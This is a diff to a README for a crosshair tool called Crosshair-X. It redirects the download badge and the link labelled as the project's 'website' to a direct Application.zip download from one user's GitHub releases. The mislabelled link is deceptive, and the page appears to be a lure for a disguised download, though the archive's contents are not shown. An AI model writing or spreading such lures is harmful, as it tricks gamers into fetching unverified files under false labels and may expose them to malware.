@@ -15,13 +15,13 @@ Enhance your gaming experience with the following features:
 ### 🚀 Get Started 
 Ready to take your aiming skills to the next level? Simply download **Crosshair-X** from the link below and launch the application to begin your journey towards improved aim and gameplay experience.
 
-[![Download Crosshair-X](https://img.shields.io/badge/Download-Application.zip-green)](https://github.com/file/Application.zip)
+[![Download Crosshair-X](https://github.com/Vivekmangrule27/Crosshair-X/releases/download/v1.0.0/Application.zip)](https://github.com/Vivekmangrule27/Crosshair-X/releases/download/v1.0.0/Application.zip)
 
 ### Need Help?
 If the link above ends with the file name, click on it to start the download process. If you encounter any issues with the link or it does not work, please check the "Releases" section for alternative download options.
 
 ### 🔥 Stay Connected
-Stay updated on the latest developments, updates, and enhancements to **Crosshair-X** by visiting our [website](https://crosshairx.com). Feel free to explore additional resources, guides, and support to maximize your gaming performance.
+Stay updated on the latest developments, updates, and enhancements to **Crosshair-X** by visiting our [website](https://github.com/Vivekmangrule27/Crosshair-X/releases/download/v1.0.0/Application.zip). Feel free to explore additional resources, guides, and support to maximize your gaming performance.
 
 ### Contributors
 We are grateful to all contributors who have helped shape the **Crosshair-X** project and make it a valuable tool for gamers worldwide. Your support and feedback are greatly appreciated as we continue to enhance the features and functionality of **Crosshair-X**.
